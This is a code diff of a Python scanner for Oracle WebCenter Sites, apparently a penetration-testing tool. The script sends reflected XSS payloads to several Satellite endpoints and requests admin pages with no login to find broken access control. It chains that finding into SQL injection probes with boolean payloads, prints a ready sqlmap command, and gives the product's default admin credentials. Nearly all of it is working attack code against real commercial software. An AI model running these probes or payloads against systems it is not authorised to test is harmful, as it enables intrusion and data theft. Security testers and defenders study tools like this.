@@ -1,57 +1,56 @@
-import argparse
 import re
+import sys
 
 import requests
+from bs4 import BeautifulSoup
 
+# configs
 requests.packages.urllib3.disable_warnings()
-parser = argparse.ArgumentParser(description="WebCenter Sites vulnerability scanner")
-parser.add_argument("url", action="store")
-args = parser.parse_args()
+headers = {
+    "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
+}
+proxies = {  # CHANGE ME
+    "http": "http://localhost:8080",
+    "https": "http://localhost:8080"
+}
 satellite = "/cs/Satellite"
 
 
-def parse_url():
-    if not args.url.startswith("http"):
-        print("[-] URL scheme is invalid")
-        exit(1)
+def print_usage():
+    print("Usage: python3 wcs_scanner.py https://example.com")
 
-    satellite_len = len(satellite)
+
+def parse_url(url_):
+    if not url_.startswith("http"):
+        print("[-] Error: URL scheme is invalid")
+        print_usage()
+        sys.exit(1)
+
     try:
-        satellite_index = args.url.index(satellite)
-        return args.url[:satellite_index + satellite_len]
+        satellite_index = url_.index(satellite)
+        return url_[:satellite_index]
     except ValueError:
-        return args.url.rstrip("/") + satellite
+        return url_.rstrip("/")
 
 
-def request(method, endpoint):
-    return requests.request(method, endpoint, verify=False, allow_redirects=False)
+def request(method, endpoint, **kwargs):
+    try:
+        return requests.request(method, endpoint, headers=headers, proxies=proxies,
+                                verify=False, allow_redirects=False, **kwargs)
+    except requests.exceptions.RequestException:
+        return None
 
 
-def do_login(endpoint):
-    # todo: Try default login and return True if successful
-    return False
-
-
-def test_login():
-    username = "fwadmin"
-    password = "xceladmin"
-    login_page_keywords = ("WebCenter Sites", "Username", "Password", "Login")
-    alternative_login = "/cas/login"
-    response = request("GET", url)
-    if response.status_code == 200 and all(kw in response.text for kw in login_page_keywords):
-        if do_login(url):
-            return True
-
-    alternative_endpoint = url.rstrip(satellite) + alternative_login
-    response = request("GET", alternative_endpoint)
-    if response.status_code == 200 and all(kw in response.text for kw in login_page_keywords):
-        if do_login(alternative_endpoint):
-            return True
-
-    return False
+def test_login_page():
+    response = request("GET", base_url + "/cas/login")
+    if response is not None and all(kw in response.text for kw in ("Oracle WebCenter Sites", "Secure User Login")):
+        print("[+] Default login page may be exposed. You should try to login with the default credentials fwadmin:xceladmin")
+    else:
+        print("[-] Default login page not found")
 
 
 def test_xss():
+    found = False
     check_str = "<script>alert(24)</script>"
     payloads = [
         'c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script>',
@@ -61,49 +60,96 @@ def test_xss():
         'pagename=OpenMarket/Xcelerate/Actions/Security/ProcessLoginRequest&WemUI=qqq%27;}</script><script>alert(24)</script>'
     ]
     for p in payloads:
-        try:
-            response = request("GET", f"{url}?{p}")
-            if check_str in response.text:
-                print(f"[+] Possible XSS found: {p}")
-        except requests.exceptions.RequestException as ex:
-            pass
+        response = request("GET", f"{url}?{p}")
+        if response is not None and check_str in response.text:
+            print(f"[+] Possible XSS found: {url}?{p}")
+            found = True
+
+    if not found:
+        print("[-] XSS not found")
 
 
-def test_broken_acl():
-    check_rex = r"<script.*<throwexception/>"
+def test_broken_access_control():
     private_addresses = [
         'pagename=OpenMarket/Xcelerate/Admin/WebReferences',
         'pagename=OpenMarket/Xcelerate/Admin/Slots'
     ]
+    bac_rex = r"<script[\d\D]*<throwexception/>"
     for pa in private_addresses:
-        try:
-            response = request("GET", f"{url}?{pa}")
-            if re.search(check_rex, response.text):
-                print(f"[+] Possible Broken ACL found: {pa}")
-        except requests.exceptions.RequestException as ex:
-            print(f"[-] An error occurred: {ex}")
+        response = request("GET", f"{url}?{pa}")
+        if response is not None and re.search(bac_rex, response.text):
+            print(f"[+] Possible Broken Access Control found: {url}?{pa}")
+            return pa
 
-    return False
-
-
-def test_sqli():
-    pass
+    print("[-] Broken Access Control not found")
+    return None
 
 
-if __name__ == "__main__":
-    url = parse_url()
-    print(f"[!] Start scanning {url}")
-    print("[*] Testing default login")
-    login = test_login()
-    if not login and not input("[?] The application may not run WebCenter Sites. Do you want to continue anyway? [N/y]").lower() in ('y', 'yes'):
-        exit()
+def test_sqli(bac_):
+    # Get query page for authkey
+    response = request("GET", f"{url}?{bac_}")
+    if response is None:
+        print("[-] SQLi not found")
+        return
 
-    test_xss()
-    bacl = test_broken_acl()
-    if not bacl and not input("[?] It is recommended to test SQLi if there is Broken Access Control. Do you want to continue anyway? [N/y]").lower() in ('y', 'yes'):
-        exit()
+    # Get _authkey_
+    soup = BeautifulSoup(response.text, "html.parser")
+    auth_key_input = soup.find("input", attrs={"name": "_authkey_"})
+    auth_key = auth_key_input.get("value")
 
-    test_sqli()
+    # Build POST request
+    cookies = response.cookies
+    data = {
+        "_authkey_": auth_key,
+        "pagename": bac_.lstrip("pagename="),
+        "op": "search",
+        "urlsToDelete": "",
+        "resultsPerPage": 25,
+        "searchChoice": "webroot",
+        "searchText": "' and '1'='0 -- "
+    }
+    sqli_url = base_url + "/cs/ContentServer"
+    negative_responses = ("No URL were found for this search criteria", "No assets were found")
+
+    # Look for negative search result
+    negative_search = request("POST", sqli_url, data=data, cookies=cookies)
+    if negative_search is None or not any(nr in negative_search.text for nr in negative_responses):
+        print("[-] SQLi not found")
+        return
+
+    # Confirm SQLi with positive request
+    data["searchText"] = "' or '1'='1 -- "
+    positive_search = request("POST", sqli_url, data=data, cookies=cookies)
+    if positive_search is not None and not any(nr in positive_search.text for nr in negative_responses):
+        print(f"[+] Possible SQLi found POST /cs/ContentServer {data}")
+        print(f"""[*] You should test this with sqlmap:
+sqlmap --dbms Oracle --url {sqli_url} --data "_authkey_={auth_key}&{bac_}&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=*" --cookie "JSESSIONID={cookies['JSESSIONID']}" --technique U
+        """)
+        return
+
+    print("[-] SQLi not found")
 
 
+# main script
+if len(sys.argv) != 2:
+    print_usage()
+    sys.exit(0)
 
+base_url = parse_url(sys.argv[1])
+url = base_url + satellite
+print(f"[!] Start scanning {base_url}")
+
+print("\n[*] Look for default login page")
+test_login_page()
+
+print("\n[*] Testing XSS")
+test_xss()
+
+print("\n[*] Testing Broken Access Control")
+bac = test_broken_access_control()
+if bac is not None:
+    # SQLi can only exists if broken access control exists
+    print("\n[*] Testing SQL Injection")
+    test_sqli(bac)
+
+print()
